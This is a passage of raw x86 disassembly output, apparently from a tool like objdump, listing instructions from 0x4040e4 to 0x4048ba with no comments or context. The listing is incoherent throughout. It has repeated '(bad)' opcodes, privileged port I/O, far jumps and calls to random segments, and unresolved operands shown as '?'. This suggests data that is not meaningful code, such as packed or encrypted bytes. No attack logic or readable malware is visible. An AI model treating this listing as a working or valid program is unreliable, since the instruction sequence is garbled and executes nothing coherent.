  4040e4:	lock jne 0x4040b3
  4040e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040e8:	mov    esp,ss
  4040ea:	scas   al,BYTE PTR es:[edi]
  4040eb:	push   ebx
  4040ec:	push   esp
  4040ed:	scas   eax,DWORD PTR es:[edi]
  4040ee:	and    cl,BYTE PTR [esi+0x3c]
  4040f1:	xchg   esp,eax
  4040f2:	dec    edx
  4040f3:	xor    DWORD PTR [edx],0xffffffd7
  4040f6:	mov    ebx,edx
  4040f8:	imul   edx,DWORD PTR [ebp-0x1],0x40
  4040fc:	sub    eax,0x9ac80afa
  404101:	mov    bh,0xf5
  404103:	(bad)  
  404104:	cmp    al,0x49
  404106:	jns    0x40411b
  404108:	mov    ds:0x433c630b,al
  40410d:	jmp    0x3d68:0x284e81b
  404114:	xchg   esi,eax
  404115:	call   0x76cb:0xa0ac4870
  40411c:	shr    BYTE PTR [eax+0x4a44a14f],0xd4
  404123:	and    ebx,edi
  404125:	ss enter 0x803e,0x3a
  40412a:	imul   eax,edx,0x78
  40412d:	fisttp WORD PTR [ebx]
  40412f:	cpuid  
  404131:	mov    ch,0xd8
  404133:	sub    esi,DWORD PTR [edx]
  404135:	jne    0x4040c1
  404137:	lods   eax,DWORD PTR ds:[esi]
  404138:	add    ebx,ebp
  40413a:	stos   DWORD PTR es:[edi],eax
  40413b:	enter  0x41bf,0x9d
  40413f:	fistp  WORD PTR [esp+edi*1+0x60318866]
  404146:	dec    ecx
  404147:	or     BYTE PTR [ecx],cl
  404149:	jmp    0x2e7b3716
  40414e:	push   esi
  40414f:	jmp    0x404191
  404151:	xor    al,0xac
  404153:	loope  0x40416a
  404155:	and    edi,DWORD PTR [eax-0x49]
  404158:	outs   dx,DWORD PTR ds:[esi]
  404159:	cmp    DWORD PTR [ebx],ebx
  40415b:	push   ebp
  40415c:	xchg   esp,eax
  40415d:	cmp    BYTE PTR [edi],al
  40415f:	in     al,0xf6
  404161:	inc    ebp
  404162:	fs pop esi
  404164:	or     eax,0xb6f120bb
  404169:	pop    ebx
  40416a:	adc    eax,0x7cf536f9
  40416f:	mov    ebx,DWORD PTR [ecx+0x11]
  404172:	addr16 xchg esi,eax
  404174:	popa   
  404175:	dec    eax
  404176:	adc    eax,0xf5ca0ca2
  40417b:	cmp    ecx,DWORD PTR [eax+0x35a3d0c7]
  404181:	dec    BYTE PTR [ecx-0x1a]
  404184:	cwde   
  404185:	cli    
  404186:	fsubrp st(7),st
  404188:	push   es
  404189:	or     DWORD PTR [ecx-0xb669df3],0xffffffa1
  404190:	pop    ecx
  404191:	or     edi,ecx
  404193:	inc    eax
  404194:	and    DWORD PTR [eax-0x1a],ebp
  404197:	fcmove st,st(7)
  404199:	push   esp
  40419a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40419b:	xor    dh,BYTE PTR [edi-0x4f56a2f2]
  4041a1:	adc    BYTE PTR [eax+ebx*8],bh
  4041a4:	jne    0x4041f6
  4041a6:	popa   
  4041a7:	test   al,0x10
  4041a9:	push   edx
  4041aa:	mov    DWORD PTR [ebx],esp
  4041ac:	inc    esp
  4041ad:	test   al,0x1e
  4041af:	retf   
  4041b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041b1:	outs   dx,BYTE PTR ds:[esi]
  4041b2:	dec    esp
  4041b3:	pop    ds
  4041b4:	mov    ds:0xf8543dad,eax
  4041b9:	pop    DWORD PTR [edx+0x6d]
  4041bc:	mov    DWORD PTR [eax],ebx
  4041be:	call   0xd75411e8
  4041c3:	sub    BYTE PTR [edx],0x24
  4041c6:	add    bl,cl
  4041c8:	or     esi,DWORD PTR [esi]
  4041ca:	enter  0x11aa,0x7e
  4041ce:	and    dl,BYTE PTR [esi]
  4041d0:	inc    ecx
  4041d1:	scas   al,BYTE PTR es:[edi]
  4041d2:	push   edi
  4041d3:	xor    edi,DWORD PTR [ebx+0x12]
  4041d6:	push   edx
  4041d7:	or     BYTE PTR [esi+ebp*8+0x24],bh
  4041db:	cmp    bh,BYTE PTR [ebx+0x2f]
  4041de:	push   0x99750c3f
  4041e3:	aam    0xfc
  4041e5:	sub    BYTE PTR [ecx+0x4a],al
  4041e8:	xchg   edx,eax
  4041e9:	jnp    0x4041db
  4041eb:	(bad)
  4041ef:	dec    edi
  4041f0:	mov    esi,ecx
  4041f2:	dec    esi
  4041f3:	sahf   
  4041f4:	stc    
  4041f5:	pop    ebp
  4041f6:	xchg   esi,eax
  4041f7:	add    bh,0xd1
  4041fa:	jge    0x404261
  4041fc:	cld    
  4041fd:	outs   dx,DWORD PTR ds:[esi]
  4041fe:	xchg   ebp,eax
  4041ff:	xchg   esi,eax
  404200:	in     eax,dx
  404201:	xchg   edx,eax
  404202:	adc    edi,esp
  404204:	jg     0x404261
  404206:	jnp    0x404247
  404208:	sar    BYTE PTR [edx+edi*4+0x5d],cl
  40420c:	fwait
  40420d:	pop    ebp
  40420e:	frstor [ecx-0x66]
  404211:	cmp    dl,BYTE PTR [edi]
  404213:	mov    ch,0x36
  404215:	xor    edx,DWORD PTR [edx+0x3]
  404218:	lds    ebp,FWORD PTR [ebx+0x1afed387]
  40421e:	out    0xdd,eax
  404220:	push   cs
  404221:	cs aaa 
  404223:	rol    bl,cl
  404225:	push   esi
  404226:	std    
  404227:	ja     0x40426a
  404229:	push   0x7d
  40422b:	aaa    
  40422c:	jbe    0x40420b
  40422e:	dec    esi
  40422f:	repnz imul esi,DWORD PTR [esi],0x35
  404233:	sbb    BYTE PTR [esi+0xdbce0d9],ch
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	punpckhdq mm2,QWORD PTR [eax]
  40425a:	inc    edx
  40425b:	mov    al,0x4f
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0xe470707d
  404265:	mov    gs,WORD PTR [ebx]
  404267:	leave  
  404268:	loop   0x40421b
  40426a:	mov    ebp,0x3693c27b
  40426f:	inc    DWORD PTR [esi-0x32]
  404272:	int3   
  404273:	outs   dx,BYTE PTR ds:[esi]
  404274:	out    dx,al
  404275:	xchg   ebx,eax
  404276:	jno    0x404238
  404278:	adc    eax,DWORD PTR [esi-0x4f]
  40427b:	stos   WORD PTR es:[edi],ax
  40427d:	das    
  40427e:	(bad)  
  404280:	test   DWORD PTR [ebx],ecx
  404282:	lds    esp,FWORD PTR [ebp-0x5a]
  404285:	std    
  404286:	les    esi,FWORD PTR [edi]
  404288:	jae    0x40420c
  40428a:	xor    eax,0x99069615
  40428f:	xadd   BYTE PTR [ecx+0x1e],dl
  404293:	rcl    BYTE PTR [esi-0x2a],cl
  404296:	test   eax,0x174b4909
  40429b:	clc    
  40429c:	data16 test al,0x96
  40429f:	lods   eax,DWORD PTR ds:[esi]
  4042a0:	adc    DWORD PTR [ebx+0x15],ebx
  4042a3:	out    dx,eax
  4042a4:	dec    esi
  4042a5:	loopne 0x404230
  4042a7:	sahf   
  4042a8:	jno    0x4042f5
  4042aa:	jne    0x40422c
  4042ac:	push   cs
  4042ad:	sbb    esp,DWORD PTR [ecx]
  4042af:	mov    al,0xe8
  4042b1:	stos   BYTE PTR es:[edi],al
  4042b2:	add    BYTE PTR [edi-0x6b1a5f28],ch
  4042b8:	mov    BYTE PTR [esi+0x7bb4f849],dh
  4042be:	cmp    al,0x63
  4042c0:	push   ss
  4042c1:	jbe    0x4042b0
  4042c3:	stos   DWORD PTR es:[edi],eax
  4042c4:	or     eax,0x7fdabfc
  4042c9:	mov    esi,0x659c2337
  4042ce:	ficom  DWORD PTR [ecx+0x65]
  4042d1:	imul   ecx,ebx,0xffffffe9
  4042d4:	sbb    DWORD PTR [edi+0x14795d11],esp
  4042da:	adc    eax,0x6718192a
  4042df:	sbb    BYTE PTR [edx],0x29
  4042e2:	push   cs
  4042e3:	in     eax,dx
  4042e4:	stos   DWORD PTR es:[edi],eax
  4042e5:	call   0xf27e:0xec685d4c
  4042ec:	add    al,0x2c
  4042ee:	or     bl,0xaf
  4042f1:	inc    edi
  4042f2:	mov    ecx,ebp
  4042f4:	xchg   DWORD PTR [eax+0x5f],edi
  4042f7:	cld    
  4042f8:	mov    edx,0x61e9e180
  4042fd:	hlt    
  4042fe:	fist   WORD PTR [edi-0x4]
  404301:	ins    BYTE PTR es:[edi],dx
  404302:	jp     0x4042e0
  404304:	mov    al,ds:0xd15272d4
  404309:	sbb    al,0x5c
  40430b:	rol    BYTE PTR [edx],0x12
  40430e:	fiadd  DWORD PTR [ebx-0x50]
  404311:	inc    esp
  404312:	stos   BYTE PTR es:[edi],al
  404313:	or     BYTE PTR [edi+edx*2+0x58a373c2],0x2f
  40431b:	adc    al,bh
  40431d:	aaa    
  40431e:	adc    dh,cl
  404320:	dec    edx
  404321:	ret    0x5758
  404324:	mov    ds:0x7f5f3e6e,al
  404329:	aam    0xdd
  40432b:	inc    esi
  40432c:	xchg   ecx,eax
  40432d:	(bad)  
  40432e:	out    0xe8,al
  404330:	imul   ebp,edx,0x73b847da
  404336:	dec    edi
  404337:	cli    
  404338:	mov    DWORD PTR [edi+0x5b126039],eax
  40433e:	inc    esp
  40433f:	xchg   esp,eax
  404340:	pop    ebp
  404341:	mov    edi,0x5249b1ba
  404346:	push   esp
  404347:	retf   0xb1ad
  40434a:	pop    ebx
  40434b:	inc    eax
  40434c:	leave  
  40434d:	ss fs inc ebp
  404350:	inc    edx
  404351:	pop    eax
  404352:	test   DWORD PTR [edi],0xff70bf12
  404358:	inc    esp
  404359:	cld    
  40435a:	fadd   st(5),st
  40435c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40435d:	sub    DWORD PTR [esi+edx*1+0x48],edi
  404361:	push   ds
  404362:	loope  0x40439c
  404364:	adc    BYTE PTR [esi],bl
  404366:	mov    ecx,0x7409d884
  40436b:	sub    ah,BYTE PTR [edi-0x23]
  40436e:	pop    edx
  40436f:	inc    ecx
  404370:	cmp    eax,0x9af455c2
  404375:	pop    ecx
  404376:	dec    edx
  404377:	mov    edi,0xd94851d0
  40437c:	call   0xc59468a3
  404381:	in     al,dx
  404382:	dec    edi
  404383:	mov    dl,0xac
  404385:	dec    esp
  404386:	fbld   TBYTE PTR [ecx+0x66e950c2]
  40438c:	pushf  
  40438d:	aaa    
  40438e:	or     edx,DWORD PTR [eax-0x80]
  404391:	sbb    eax,0x336170d5
  404396:	hlt    
  404397:	in     al,0x8e
  404399:	cli    
  40439a:	xor    ch,BYTE PTR [edi+eax*4+0x476bc30f]
  4043a1:	cmp    BYTE PTR [ebp+esi*1-0x23],dl
  4043a5:	sbb    eax,0xd4a20f52
  4043aa:	or     ah,ch
  4043ac:	xor    dh,BYTE PTR [ebp-0x5e6cc2d6]
  4043b2:	les    edx,FWORD PTR [eax+0x54]
  4043b5:	arpl   dx,sp
  4043b7:	call   0x3116:0x85a5ec4c
  4043be:	cmp    ch,BYTE PTR [edi]
  4043c0:	and    edi,DWORD PTR [ecx-0x123d2a5e]
  4043c6:	pop    ds
  4043c7:	jmp    0xd26af7e1
  4043cc:	call   0xfc2:0x16bce94a
  4043d3:	leave  
  4043d4:	inc    edi
  4043d5:	mov    ebx,0x5e016140
  4043da:	xor    ebp,DWORD PTR [edx+0x8d71b05]
  4043e0:	outs   dx,BYTE PTR ds:[esi]
  4043e1:	inc    edi
  4043e2:	icebp  
  4043e3:	ins    DWORD PTR es:[edi],dx
  4043e4:	(bad)  
  4043e5:	std    
  4043e6:	inc    esi
  4043e7:	add    al,0x40
  4043e9:	out    dx,al
  4043ea:	mov    dl,0x25
  4043ec:	add    ecx,DWORD PTR [ebx-0x591f6a63]
  4043f2:	(bad)  
  4043f3:	iret   
  4043f4:	(bad)  
  4043f5:	sbb    al,0xd1
  4043f7:	jnp    0x40443e
  4043f9:	mov    ebx,cs
  4043fb:	or     al,0xac
  4043fd:	out    0x74,al
  4043ff:	mov    ss,WORD PTR [edi]
  404401:	adc    DWORD PTR [ebp+eax*4+0x4d],0x68e2614a
  404409:	jecxz  0x404457
  40440b:	pop    edx
  40440c:	push   ebp
  40440d:	lods   eax,DWORD PTR ds:[esi]
  40440e:	jbe    0x404394
  404410:	jns    0x4043b8
  404412:	push   ss
  404413:	adc    DWORD PTR [ebx+0x1b97d1ee],ecx
  404419:	imul   ebx,DWORD PTR [esp+ebx*4],0x3d
  40441d:	and    BYTE PTR ds:0xb8a21a5c,ah
  404423:	sbb    BYTE PTR [edx+0x24373344],ah
  404429:	pop    ds
  40442a:	sub    BYTE PTR [edx+edx*8],dh
  40442d:	inc    edi
  40442e:	xor    DWORD PTR [ebx-0x17a22510],ebx
  404434:	aam    0xcc
  404436:	sahf   
  404437:	cli    
  404438:	and    eax,ecx
  40443a:	xchg   BYTE PTR [eax-0xf],bh
  40443d:	mov    ah,0x11
  40443f:	icebp  
  404440:	test   eax,0xd5c577be
  404445:	cwde   
  404446:	mov    DWORD PTR [eax],esp
  404448:	int    0x11
  40444a:	add    al,0xcf
  40444c:	push   cs
  40444d:	shl    DWORD PTR [esi+0x6f],0xb
  404451:	xchg   ecx,eax
  404452:	cld    
  404453:	jmp    0x7663:0xb5acc48e
  40445a:	leave  
  40445b:	jne    0x404429
  40445d:	add    DWORD PTR [eax-0x556dd0ce],esi
  404463:	je     0x404401
  404465:	nop
  404466:	or     eax,0xb8f1068e
  40446b:	shl    BYTE PTR [ebx],0x24
  40446e:	out    0x14,eax
  404470:	pop    esi
  404471:	pop    edi
  404472:	pop    ss
  404473:	call   0x5df3:0x9e473773
  40447a:	pop    ecx
  40447b:	add    cl,BYTE PTR [ecx+0x7440df71]
  404481:	hlt    
  404482:	(bad)  
  404483:	and    DWORD PTR [ebx+0x29f4897a],ecx
  404489:	call   0x53aa5d0
  40448e:	cli    
  40448f:	div    BYTE PTR [eax-0x6e8c12f6]
  404495:	xchg   ebp,eax
  404496:	imul   edi,DWORD PTR [eax+0x3159138b],0xe631064c
  4044a0:	cmp    bh,ch
  4044a2:	ficom  WORD PTR [ebp+0x7e969e8b]
  4044a8:	or     ecx,0xb0aba501
  4044ae:	jns    0x404442
  4044b0:	jo     0x4044c1
  4044b2:	in     eax,0x7e
  4044b4:	mov    dh,al
  4044b6:	idiv   DWORD PTR [ecx-0x54]
  4044b9:	sub    cl,BYTE PTR [ebx+0x47]
  4044bc:	lea    eax,[edi-0x35]
  4044bf:	fmul   st,st(7)
  4044c1:	dec    edi
  4044c2:	push   edx
  4044c3:	sahf   
  4044c4:	dec    ecx
  4044c5:	aam    0xe0
  4044c7:	test   BYTE PTR [edi+0x9],ch
  4044ca:	das    
  4044cb:	and    BYTE PTR [edx-0x5381cc6e],al
  4044d1:	rol    DWORD PTR [ebp+0x46],0x90
  4044d5:	imul   ecx,DWORD PTR [edi+0x51],0xabe20c12
  4044dc:	lock out 0x2f,al
  4044df:	pushf  
  4044e0:	(bad)  
  4044e1:	cmp    esi,DWORD PTR [ecx+ecx*1-0x2e]
  4044e5:	push   0x6176e05a
  4044ea:	mov    ?,edi
  4044ec:	push   ebp
  4044ed:	ror    BYTE PTR [esi-0x5720874e],cl
  4044f3:	retf   
  4044f4:	adc    DWORD PTR [edx],eax
  4044f6:	(bad)  
  4044f7:	imul   eax,DWORD PTR [ecx-0x1d],0xffffffb0
  4044fb:	(bad)  
  4044fd:	std    
  4044fe:	sbb    bl,0x77
  404501:	push   0x4ee85cf1
  404506:	dec    ecx
  404507:	(bad)  
  404508:	push   ebp
  404509:	mov    bh,0xe7
  40450b:	pop    esi
  40450c:	xor    BYTE PTR cs:[ecx+eiz*1+0x1a],dl
  404511:	mov    eax,0xf984dc2d
  404516:	mov    eax,ds:0x11122a0
  40451b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451c:	les    edi,FWORD PTR [edi+0x63399f1a]
  404522:	ret    
  404523:	mov    ds,WORD PTR [edx+0x73f74ce3]
  404529:	xchg   dh,dh
  40452b:	or     ch,dl
  40452d:	push   es
  40452e:	popf   
  40452f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404530:	inc    esi
  404531:	cmc    
  404532:	dec    bx
  404534:	(bad)  
  404535:	cmp    al,0x5b
  404537:	js     0x404554
  404539:	jle    0x3cda0aa0
  40453f:	ror    dl,0xde
  404542:	or     DWORD PTR [ecx-0x27],0x8dc51b27
  404549:	es pop edx
  40454b:	out    0x3,al
  40454d:	xor    al,0x91
  40454f:	scas   eax,DWORD PTR es:[edi]
  404550:	and    DWORD PTR [esi-0x4a0c5b9c],edx
  404556:	inc    ebp
  404557:	xor    al,0x64
  404559:	cmp    BYTE PTR [edx+0x72],ah
  40455c:	pop    ecx
  40455d:	sahf   
  40455e:	cwde   
  40455f:	jecxz  0x4045c5
  404561:	clc    
  404562:	mov    bl,0xe
  404564:	mov    ebp,0xa1f6fa99
  404569:	ret    
  40456a:	loop   0x404549
  40456c:	xchg   BYTE PTR [esi-0x74e5a870],bh
  404572:	rcl    edi,1
  404574:	mov    dh,0x94
  404576:	and    bl,BYTE PTR [ebx+0x42477b7f]
  40457c:	popf   
  40457d:	xor    al,0x56
  40457f:	ja     0x4045b6
  404581:	test   DWORD PTR [edx+ecx*4+0x754af4b1],edi
  404588:	int3   
  404589:	rol    DWORD PTR [edx-0x45],cl
  40458c:	adc    dl,BYTE PTR [edx]
  40458e:	add    cl,BYTE PTR [edx+ecx*2-0x361595a2]
  404595:	dec    esp
  404596:	cmp    ebp,DWORD PTR [ebx-0x2e7a52f6]
  40459c:	rol    DWORD PTR [ebx+esi*4-0x13],cl
  4045a0:	cli    
  4045a1:	(bad)  
  4045a2:	test   WORD PTR ds:[ecx+0x11820f8c],di
  4045aa:	stc    
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	adc    BYTE PTR [ebx],ah
  4045c9:	into   
  4045ca:	or     cl,BYTE PTR [esp]
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0x8470707d
  4045d4:	shl    DWORD PTR [eax],cl
  4045d6:	addr16 (bad) 
  4045d8:	cld    
  4045d9:	adc    al,0x89
  4045db:	push   eax
  4045dc:	aad    0x2b
  4045de:	es mov ecx,ds
  4045e1:	mov    DWORD PTR [ebp-0x6a],edi
  4045e4:	aam    0x3e
  4045e6:	int3   
  4045e7:	mov    dl,0xda
  4045e9:	pop    ss
  4045ea:	push   eax
  4045eb:	ss aaa 
  4045ed:	jns    0x404659
  4045ef:	mov    ds:0x2fe8ec99,eax
  4045f4:	xchg   ebx,eax
  4045f5:	cmp    al,0xb6
  4045f7:	sbb    al,BYTE PTR [ecx+0x16]
  4045fa:	ds sahf 
  4045fc:	add    esi,DWORD PTR [edi-0x4d079636]
  404602:	bound  ebx,QWORD PTR [eax+0x5e]
  404605:	ficom  DWORD PTR [ebx+0x72ded452]
  40460b:	popf   
  40460c:	or     dl,dh
  40460e:	or     DWORD PTR [edi],eax
  404610:	enter  0xef19,0x52
  404614:	cwde   
  404615:	(bad)  
  404616:	clc    
  404617:	(bad)  
  404618:	jb     0x4045f5
  40461a:	sbb    eax,0x2beffd7e
  40461f:	xor    ecx,DWORD PTR [esi-0x18]
  404622:	ret    
  404623:	(bad)  
  404624:	push   0xc8fa6715
  404629:	bound  edx,QWORD PTR [esi]
  40462b:	rol    DWORD PTR [eax+0x10],1
  40462e:	jae    0x40466f
  404630:	shr    BYTE PTR [eax],cl
  404632:	xor    dl,BYTE PTR [edx-0x7d0760a1]
  404638:	sbb    al,0x66
  40463a:	xor    eax,0x375d58b0
  40463f:	repz je 0x404643
  404642:	cli    
  404643:	fldenv [ebp+0x7b]
  404646:	and    cl,bl
  404648:	xor    eax,0x8077a88e
  40464d:	cmp    BYTE PTR [eax+eax*8-0xa],al
  404651:	mov    cs,WORD PTR [ecx+0x10c923b6]
  404657:	inc    esi
  404658:	mov    edi,DWORD PTR [ecx]
  40465a:	inc    esp
  40465b:	ror    DWORD PTR [ecx],cl
  40465d:	jp     0x404620
  40465f:	pop    ecx
  404660:	popf   
  404661:	ins    DWORD PTR es:[edi],dx
  404662:	mov    bl,0xeb
  404664:	mov    bl,BYTE PTR [ebx+0x12747648]
  40466a:	out    dx,al
  40466b:	mov    ah,BYTE PTR [edi]
  40466d:	fsubr  st,st(3)
  40466f:	sub    esi,edi
  404671:	imul   ecx,ecx,0x4
  404674:	dec    eax
  404675:	mov    ebx,0xcbe1ff37
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	outs   dx,BYTE PTR ds:[esi]
  40467c:	cmp    DWORD PTR [ebp+0x1c],ebx
  40467f:	sub    DWORD PTR [ecx],esi
  404681:	jno    0x404630
  404683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404684:	xchg   esp,eax
  404685:	push   es
  404686:	add    eax,edx
  404688:	fdivr  QWORD PTR [esi+0x2e]
  40468b:	mov    ds:0x32cda7de,eax
  404690:	(bad)  
  404691:	fidiv  DWORD PTR [ebx]
  404693:	inc    esi
  404694:	test   eax,0x8d5a4a0d
  404699:	sbb    bl,BYTE PTR [edi]
  40469b:	sub    BYTE PTR [ebx-0x51],ah
  40469e:	mov    esi,0xa29ffa18
  4046a3:	xchg   ebx,eax
  4046a4:	sbb    ebx,0x20ee2148
  4046aa:	sbb    al,0x45
  4046ac:	int    0x93
  4046ae:	jp     0x404638
  4046b0:	xchg   esp,eax
  4046b1:	rol    BYTE PTR [esi],1
  4046b3:	add    al,ah
  4046b5:	call   0xe7e7:0xdbc30506
  4046bc:	pop    ebx
  4046bd:	ins    DWORD PTR es:[edi],dx
  4046be:	xchg   esi,eax
  4046bf:	pop    eax
  4046c0:	cli    
  4046c1:	jmp    0xad9a:0x53d535f3
  4046c8:	mov    esi,0x882b128a
  4046cd:	and    DWORD PTR [ebx+0x22ea09ef],ebp
  4046d3:	or     esp,ebp
  4046d5:	mov    edi,edi
  4046d7:	pop    ecx
  4046d8:	mov    al,0xf2
  4046da:	mov    dl,0x2f
  4046dc:	test   BYTE PTR [edi+0x15d7467e],bl
  4046e2:	iret   
  4046e3:	inc    esp
  4046e4:	xchg   DWORD PTR [edx+0x35],edi
  4046e7:	loopne 0x40467e
  4046e9:	scas   al,BYTE PTR es:[edi]
  4046ea:	pop    ss
  4046eb:	sbb    DWORD PTR [eax],0xba1c686a
  4046f1:	or     DWORD PTR [edi],ecx
  4046f3:	mov    eax,0x6c4eb071
  4046f8:	jnp    0x4046d6
  4046fa:	inc    ebp
  4046fb:	(bad)  
  4046fc:	dec    eax
  4046fd:	jne    0x404739
  4046ff:	retf   
  404700:	xor    al,0xa2
  404702:	addr16 mov bh,0xc
  404705:	mov    esi,0xbe9df15b
  40470a:	push   edx
  40470b:	xor    al,0x16
  40470d:	cmp    eax,0x7a9400f3
  404712:	cmp    BYTE PTR [edi-0x1c],ch
  404715:	loope  0x404740
  404717:	sbb    eax,0x7f6a1e88
  40471c:	pop    ds
  40471d:	mov    bl,0x9
  40471f:	mov    esi,0xdb744fa5
  404724:	pop    ss
  404725:	fwait
  404726:	adc    eax,0x7795ab66
  40472b:	cmp    cl,0x96
  40472e:	popf   
  40472f:	xchg   esi,eax
  404730:	shr    BYTE PTR [ecx-0x1c],0xed
  404734:	xchg   edx,eax
  404735:	popa   
  404736:	sub    al,0x1a
  404738:	add    al,0x48
  40473a:	jmp    0x40470c
  40473c:	je     0x4047a7
  40473e:	into   
  40473f:	push   eax
  404740:	xor    DWORD PTR [edi+0x9],eax
  404743:	pusha  
  404744:	cmp    ecx,0x318cd1d1
  40474a:	out    dx,eax
  40474b:	(bad)  
  40474c:	movntq (bad),mm7
  40474d:	out    0xfa,eax
  40474f:	pop    ds
  404750:	mov    BYTE PTR [esi],dh
  404752:	cli    
  404753:	dec    BYTE PTR [ecx+0x1463d6aa]
  404759:	mov    ecx,0x56d8f63e
  40475e:	mov    BYTE PTR [eax-0x8],dl
  404761:	scas   eax,DWORD PTR es:[edi]
  404762:	pop    esp
  404763:	shr    BYTE PTR [esi],0xba
  404766:	shr    ecx,cl
  404768:	dec    ebp
  404769:	ficom  DWORD PTR [ebp+0x1575f320]
  40476f:	jae    0x4047c3
  404771:	shl    BYTE PTR [ecx+0x363b21c1],1
  404777:	mov    esp,0x2064cb5f
  40477c:	cmp    eax,0x11f1f43a
  404781:	fild   WORD PTR [esi]
  404783:	rol    DWORD PTR [eax+0xc],1
  404786:	out    0xb,al
  404788:	popa   
  404789:	adc    al,0xb3
  40478b:	jo     0x40473c
  40478d:	stos   DWORD PTR es:[edi],eax
  40478e:	cmc    
  40478f:	gs pop esi
  404791:	shl    DWORD PTR [edi+eiz*2],0xa1
  404795:	es and ecx,ebx
  404798:	xchg   BYTE PTR [esi],ch
  40479a:	jae    0x40477c
  40479c:	mov    cl,0x9f
  40479e:	cld    
  40479f:	mov    ?,ebp
  4047a1:	scas   al,BYTE PTR es:[edi]
  4047a2:	mov    esi,0xfc5bf60a
  4047a7:	cdq    
  4047a8:	fld    TBYTE PTR [ebx+0x26]
  4047ab:	xor    DWORD PTR [ecx],esi
  4047ad:	push   ds
  4047ae:	push   0xffffffc2
  4047b0:	pop    ss
  4047b1:	mov    al,0xbc
  4047b3:	mov    BYTE PTR [eax-0x46ede3f6],cl
  4047b9:	push   ss
  4047ba:	inc    eax
  4047bb:	dec    eax
  4047bc:	mov    edi,0xc2f69b
  4047c1:	ds push ebp
  4047c3:	mov    dh,0x3c
  4047c5:	inc    edx
  4047c6:	and    al,0x17
  4047c8:	mov    esi,0x66448de6
  4047cd:	cld    
  4047ce:	mov    edi,?
  4047d0:	fs pushf 
  4047d2:	dec    ebx
  4047d3:	data16 mov ah,0xd
  4047d6:	xor    DWORD PTR [ecx-0x447be98b],ebx
  4047dc:	dec    esi
  4047dd:	imul   eax,DWORD PTR [eax+0x751a06d7],0x17107f6f
  4047e7:	test   eax,0xf4c8696a
  4047ec:	push   eax
  4047ed:	cmp    DWORD PTR [ecx+0x3c],edx
  4047f0:	mov    al,ds:0x44bd870b
  4047f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047f6:	fld    TBYTE PTR [ecx+edi*2]
  4047f9:	adc    ebp,DWORD PTR [edi+0x1d347063]
  4047ff:	setbe  dh
  404802:	xchg   ecx,eax
  404803:	lods   eax,DWORD PTR ds:[esi]
  404804:	mov    esi,0x71c66b0
  404809:	add    al,0xf6
  40480b:	fs pop edi
  40480e:	popa   
  40480f:	sahf   
  404810:	stos   BYTE PTR es:[edi],al
  404811:	loop   0x40488e
  404813:	sar    BYTE PTR ds:0x85a3908b,1
  404819:	iret   
  40481a:	jb     0x4047e4
  40481c:	clc    
  40481d:	dec    esp
  40481e:	call   0xcc7ba740
  404823:	imul   ecx,esi,0xffffffdf
  404826:	xor    ch,ch
  404828:	fs call 0x95901c2c
  40482e:	cmp    eax,DWORD PTR [esi]
  404830:	jns    0x4047ca
  404832:	popf   
  404833:	jmp    DWORD PTR [esi-0xae25bf2]
  404839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40483a:	and    ch,0x82
  40483d:	pop    esp
  40483e:	mov    ebp,0xf5593d82
  404843:	jbe    0x4047c5
  404845:	inc    eax
  404846:	frstor [edx+0x7d]
  40484a:	inc    edi
  40484b:	cdq    
  40484c:	adc    ecx,DWORD PTR [esi+0xf]
  40484f:	retf   0x34b8
  404852:	or     bh,BYTE PTR [edi]
  404854:	dec    edi
  404855:	repnz mov ds:0xce3d4693,eax
  40485b:	shr    DWORD PTR [ebp-0xd],1
  40485e:	out    dx,eax
  40485f:	out    dx,eax
  404860:	rol    bl,cl
  404862:	lahf   
  404863:	(bad)  
  404864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404865:	mov    bh,0x16
  404867:	dec    esp
  404868:	inc    esi
  404869:	call   0x9a23:0x2338817e
  404870:	mov    BYTE PTR [edi+0x47],bl
  404873:	mov    ch,bl
  404875:	loopne 0x404854
  404877:	es pusha 
  404879:	ss jo  0x404882
  40487c:	ins    BYTE PTR es:[edi],dx
  40487d:	loope  0x40482e
  40487f:	mov    al,ds:0xe5fcc69e
  404884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404885:	mov    ds:0x4a32544,eax
  40488a:	fnsave [edi]
  40488c:	cmc    
  40488d:	cli    
  40488e:	out    dx,eax
  40488f:	xchg   ecx,eax
  404890:	jge    0x4048e0
  404892:	(bad)  
  404893:	xlat   BYTE PTR ds:[ebx]
  404894:	jo     0x4048ad
  404896:	retf   0x8c5c
  404899:	jmp    0x8c823f9
  40489e:	sub    DWORD PTR ds:0xb9cd7bc9,ebp
  4048a4:	int    0xd6
  4048a6:	ficomp DWORD PTR [eax+0x69aa21aa]
  4048ac:	mov    es,WORD PTR [esi-0x4c]
  4048af:	sti    
  4048b0:	mov    dh,0x52
  4048b2:	sbb    DWORD PTR [edi+ebp*2+0x6e],ebx
  4048b6:	xchg   ebx,eax
  4048b7:	js     0x4048a7
  4048b9:	stc    
  4048ba:	xlat   BYTE PTR ds:[ebx]
